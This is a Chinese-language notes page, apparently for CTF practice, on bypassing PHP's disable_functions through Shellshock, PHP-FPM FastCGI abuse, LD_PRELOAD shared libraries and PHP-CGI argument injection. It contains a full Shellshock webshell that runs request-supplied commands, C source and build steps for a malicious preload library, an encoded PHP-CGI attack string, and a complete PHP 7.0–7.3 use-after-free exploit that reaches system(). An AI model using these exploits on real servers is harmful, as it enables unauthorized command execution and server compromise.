# bypass disable_function

## GNU Bash 环境变量远程命令执行漏洞 CVE-2014-6271

>    被攻击的bash存在漏洞（版本小于等于4.3）
>    攻击者可以控制环境变量
>    新的bash进程被打开触发漏洞并执行命令

利用php的mail函数:https://www.exploit-db.com/exploits/35146 

https://www.antiy.com/response/CVE-2014-6271.html

### **漏洞原理**

4.3及之前的bash启动解析环境变量时未对边界进行严格的限制

“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。核心的原因在于在输入的过滤中没有严格限制边界，没有做合法化的参数判断。



bash函数的格式,调用函数只需变量名+参数即可`函数 参数1 参数2`

```bash
funtion ShellShock 
{ echo "Injection"} ShellShock   #调用这个函数
```

这个时候的Bash的环境变量：

```
KEY = ShellShockVALUE = () { echo Injection; }


```

来看看ShellShock漏洞的真身：

```shell
export ShellShock='() { :; }; echo;/usr/bin/whoami'
bash>Kr0iN
```

看看环境变量你有什么
![image.png](https://i.loli.net/2019/09/11/nhgdTelRLotsjym.png)




```bash
env x='() { :;}; echo Vulnerable CVE-2014-6271 ' bash -c "echo test"
```

![image.png](https://i.loli.net/2019/09/11/nhgdTelRLotsjym.png)



### 利用方式

#### php的mail函数()

如果服务器的默认sh是bash,mail函数会生成一个bash进程,再结合putenv()利用破壳漏洞来实现任意命令执行

会生成bash进程除了mail,php函数还有imap_mail，如果你仅仅通过禁用mail函数来规避这个安全问题，那么imap_mail是可以做替代的。当然，php里还可能有其他地方有调用popen或其他能够派生bash子进程的函数，通过这些地方，都可以通过破壳漏洞执行命令的。

更详细的解释:p牛的[PHP Execute Command Bypass Disable_functions](https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html)

```php
# Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions)
# Google Dork: none
# Date: 10/31/2014
# Exploit Author: Ryan King (Starfall)
# Vendor Homepage: http://php.net
# Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror
# Version: 5.* (tested on 5.6.2)
# Tested on: Debian 7 and CentOS 5 and 6
# CVE: CVE-2014-6271
<pre>
<?php echo "Disabled functions: ".ini_get('disable_functions')."\n"; ?>
<?php
function shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283
   if(strstr(readlink("/bin/sh"), "bash") != FALSE) {
     $tmp = tempnam(".","data");
     putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");
     // In Safe Mode, the user may only alter environment variables whose names
     // begin with the prefixes supplied by this directive.
     // By default, users will only be able to set environment variables that
     // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive is empty,
     // PHP will let the user modify ANY environment variable!
     mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actually send any mail
   }
   else return "Not vuln (not bash)";
   $output = @file_get_contents($tmp);
   @unlink($tmp);
   if($output != "") return $output;
   else return "No output, or not vuln.";
}
echo shellshock($_REQUEST["cmd"]);
?>
```





## 利用php-fpm未授权访问漏洞

### 推荐文章

[Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html)

[浅析php-fpm的攻击方式](https://xz.aliyun.com/t/5598)

### 什么是php-fpm

php-fpm是php官方的fastcgi解析器,Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。FPM按照fastcgi的协议将TCP流解析成真正的数据。

说到fastcgi,就必须先讲一下cgi

cgi的历史:

> 早期的webserver只处理html等静态文件，但是随着技术的发展，出现了像php等动态语言。
> webserver处理不了了，怎么办呢？那就交给php解释器来处理吧！
> 交给php解释器处理很好，但是，php解释器如何与webserver进行通信呢？
> 为了解决不同的语言解释器(如php、python解释器)与webserver的通信，于是出现了cgi协议。只要你按照cgi协议去编写程序，就能实现语言解释器与webwerver的通信。如php-cgi程序。

Fast-CGI:

虽然cgi解决php解释器与webserver的通信问题，但是webserver每收到一个请求就会去fork一个cgi进程,请求结束再kill掉这个进程,这样会很浪费资源,于是出现了cgi的改良版本。

> fast-cgi每次处理完请求后，不会kill掉这个进程，而是保留这个进程，使这个进程可以一次处理多个请求。这样每次就不用重新fork一个进程了，大大提高了效率。

php-fpm 是一个Fastcgi的实现,并提供进程管理功能。

进程包含了master进程和worker进程

master进程只有一个,负责监听端口(一般是9000)接收来自Web Server的请求,而worker进程则一般有多个(具体数量根据实际需要配置),每个进程内部都嵌入了一个php解释器,是php代码真正执行的地方。

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20190709100809-65db4fc6-a1ee-1.jpg)](https://xzfile.aliyuncs.com/media/upload/picture/20190709100809-65db4fc6-a1ee-1.jpg)

上面第一个是主进程,下面两个是worker进程。



### 服务器利用fastcgi的通信过程

Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。

fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。

类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。

record具有固定的结构。

```c
typedef struct {
  /* Header */
  unsigned char version; // 版本
  unsigned char type; // 本次record的类型
  unsigned char requestIdB1; // 本次record对应的请求id
  unsigned char requestIdB0;
  unsigned char contentLengthB1; // body体的大小
  unsigned char contentLengthB0;
  unsigned char paddingLength; // 额外块大小
  unsigned char reserved; 

  /* Body */
  unsigned char contentData[contentLength];
  unsigned char paddingData[paddingLength];
} FCGI_Record;
```

而其中的`type`就是指定该record的作用。因为fastcgi一个record的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个record。通过`type`来标志每个record的作用，用`requestId`作为同一次请求的id。

也就是说，每次请求，会有多个record，他们的`requestId`是相同的。

借用[该文章](http://blog.csdn.net/shreck66/article/details/50355729)中的一个表格，列出最主要的几种`type`：

![image.png](https://i.loli.net/2019/09/10/4CbPDvp6XlAkWiI.png)



根据这个表格我们可以猜测，服务器中间件和后端语言通信，第一个数据包就是`type`为1的record，后续互相交流，发送`type`为4、5、6、7的record，结束时发送`type`为2、3的record。

我们要关注的重点就是type=4的部分,也就是是设置环境变量的地方。

php里有很多有趣的设置,像文件包含里常用的php设置`auto_prepared_file,auto_append_file`

我们令`auto_prepared_file=php://input`且`allow_url_include=On`

那么我们该如何利用fastcgi来设置php的环境变量

这又涉及到PHP-FPM的两个环境变量，`PHP_VALUE`和`PHP_ADMIN_VALUE`。这两个环境变量就是用来设置PHP配置项的，`PHP_VALUE`可以设置模式为`PHP_INI_USER`和`PHP_INI_ALL`的选项，`PHP_ADMIN_VALUE`可以设置所有选项。（`disable_functions`除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）

结构体实例:

```php
array(
		'GATEWAY_INTERFACE' => 'FastCGI/1.0',
		'REQUEST_METHOD' => 'POST',
		'SCRIPT_FILENAME' => '/var/www/html/index.php',
		'SERVER_SOFTWARE' => 'php/fcgiclient',
		'REMOTE_ADDR' => '127.0.0.1',
		'REMOTE_PORT' => '9985',
		'SERVER_ADDR' => '127.0.0.1',
		'SERVER_PORT' => '80',
		'SERVER_NAME' => 'mag-tured',
		'SERVER_PROTOCOL' => 'HTTP/1.1',
		'CONTENT_TYPE' => 'application/x-www-form-urlencoded',
        'CONTENT_LENGTH' => strlen($content),
        'PHP_VALUE' =>'auto_append_file=php://input',
        'PHP_ADMIN_VALUE'=>'allow_url_include=On'
	)
```



### 原理浅析

这个原理的漏洞原因是PHP-FPM未授权访问漏洞,php-fpm没有对发送数据的来源进行验证,导致只要我们向php-fpm发送符合格式的数据就可以被解析.再结合fastcgi设置环境变量的部分来达到getshell

### fpm利用脚本

分享个p牛脚本里面的一个client客户端: [Python FastCGI Client](https://github.com/wuyunfeng/Python-FastCGI-Client)
还有Lz1y师傅给的一个php客户端 [PHP FastCGI Client](https://github.com/adoy/PHP-FastCGI-Client.git)

还要php语言客户端: [fastcgi客户端PHP语言实现](http://nullget.sourceforge.net/?q=node/795&lang=zh-hans)



## LD_PRELOAD绕过



这里我们先来看一下原理，首先什么是LD_PRELOAD？

google给出如下定义

```
LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.
```

即LD_PRELOAD这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用

而putenv可以设置环境变量

```php
putenv ( string $setting ) : bool
```

添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。

那么我们可以进行一下骚操作

>1.制作一个恶意shared libraries
>2.使用putenv设置LD_PRELOAD为恶意文件路径
>3.使用某个php函数，触发specific shared library

### 利用函数

`putenv,errorlog,mail`

### 如何制作shared libraries

选择要替换的函数我们这里选取geteuid()

理由是php的mail()函数会调用系统的sendmail命令而sendmail命令会调用getuid()这个函数,所以我们确定目标为geteuid函数

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void payload() {
	system("ls > result.txt");
	}
    int  geteuid() {
    if (getenv("LD_PRELOAD") == NULL) 
    { return 0; }
    unsetenv("LD_PRELOAD");
    payload();
  	}
```

当这个共享库中的 `geteuid` 被调用时，尝试加载 `payload()` 函数，执行命令。这个测试函数写的很简单，实际应用时可相应调整完善。在攻击机上（注意编译平台应和靶机平台相近，至少不能一个是 32 位一个是 64 位）把它编译为一个位置信息无关的动态共享库：

```
gcc -c -fPIC hack.c -o hack
gcc -shared hack -o hack.so
```

### 利用

将恶意的.so文件上传到服务器

执行如下代码,即可载入恶意命令

```php
<?php
putenv("LD_PRELOAD=/var/www/hack.so");
mail("[email protected]","","","","");
?>
```

### 相关文章

https://www.anquanke.com/post/id/175403

https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html

[https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/#8-mail-%E7%AC%AC%E4%BA%94%E4%B8%AA%E5%8F%82%E6%95%B0-excrt-cmd](https://www.k0rz3n.com/2019/02/12/PHP 中可以利用的危险的函数/#8-mail-第五个参数-excrt-cmd)

https://www.freebuf.com/articles/web/169156.html

## apache+php cgi mod攻击

### 原理

php作为cgi模式运行的时候，接受-s  -d -c 这样的参数，我们看看这些参数的功能

```html
-s Output HTML syntax highlighted source -d foo[=bar] Define INI entry foo with value bar
```

然后再看看攻击代码片段

```php
char poststr[] = "POST %s?%%2D%%64+%%61%%6C%%6C%%6F%%77%%5F" \ "%%75%%72%%6C%%5F%%69%%6E%%63%%6C%%75%%64%%65%%3D%%6F%%6E+%%2D%%64" \ "+%%73%%61%%66%%65%%5F%%6D%%6F%%64%%65%%3D%%6F%%66%%66+%%2D%%64+%%73" \ "%%75%%68%%6F%%73%%69%%6E%%2E%%73%%69%%6D%%75%%6C%%61%%74%%69%%6F%%6E" \ "%%3D%%6F%%6E+%%2D%%64+%%64%%69%%73%%61%%62%%6C%%65%%5F%%66%%75%%6E%%63" \ "%%74%%69%%6F%%6E%%73%%3D%%22%%22+%%2D%%64+%%6F%%70%%65%%6E%%5F%%62" \ "%%61%%73%%65%%64%%69%%72%%3D%%6E%%6F%%6E%%65+%%2D%%64+%%61%%75%%74" \ "%%6F%%5F%%70%%72%%65%%70%%65%%6E%%64%%5F%%66%%69%%6C%%65%%3D%%70%%68" \ "%%70%%3A%%2F%%2F%%69%%6E%%70%%75%%74+%%2D%%64+%%63%%67%%69%%2E%%66%%6F" \ "%%72%%63%%65%%5F%%72%%65%%64%%69%%72%%65%%63%%74%%3D%%30+%%2D%%64+%%63" \ "%%67%%69%%2E%%72%%65%%64%%69%%72%%65%%63%%74%%5F%%73%%74%%61%%74%%75%%73" \ "%%5F%%65%%6E%%76%%3D%%30+%%2D%%6E HTTP/1.1\r\n" \
```



解码出来是



```php
%s?-d allow_url_include=on -d safe_mode=off -d suhosin.simulation3Don -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input -d cgi.fo"rce_redirect=0 -d cgi.redirect_status_env=0 -n
```



这样Kingcope的攻击代码思路就出来了。

关闭各种防护的参数，打开各种危险的参数，最后利用auto_prepend_file（或auto_append_file）这个参数把黑客需要执行的系统命令传递过去了。

### 利用条件

1、apache+php是用cgi模式跑的，例如apache的mod_cgid

2、php解释器需要可以从下面的url访问到，当然或许可能是其他的url，这个具体要看你的配置

```html
	/cgi-bin/php
	/cgi-bin/php5
	/cgi-bin/php-cgi
	/cgi-bin/php.cgi
	/cgi-bin/php4
```

3、php版本
PHP版本小于5.3.12
PHP版本小于5.4.2

### 推荐网址

https://www.freebuf.com/articles/web/169156.html

## 脚本

```php
<?php
# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=72530
#
# This exploit should work on all PHP 7.0-7.3 versions
# released as of 04/10/2019, specifically:
# 
# PHP 7.0 - 7.0.33
# PHP 7.1 - 7.1.31
# PHP 7.2 - 7.2.23
# PHP 7.3 - 7.3.10
#
# Author: https://github.com/mm0r1
pwn("/readflag");

function pwn($cmd) {
    global $abc, $helper;

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $text_size) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $text_size) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    class ryat {
        var $ryat;
        var $chtg;
        
        function __destruct()
        {
            $this->chtg = $this->ryat;
            $this->ryat = 1;
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; # increase this value if you get segfaults

    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_repeat('A', 79);

    $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}';
    $out = unserialize($poc);
    gc_collect_cycles();

    $v = [];
    $v[0] = ptr2str(0, 79);
    unset($v);
    $abc = $out[2][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    ($helper->b)($cmd);
    
    exit();
}
```

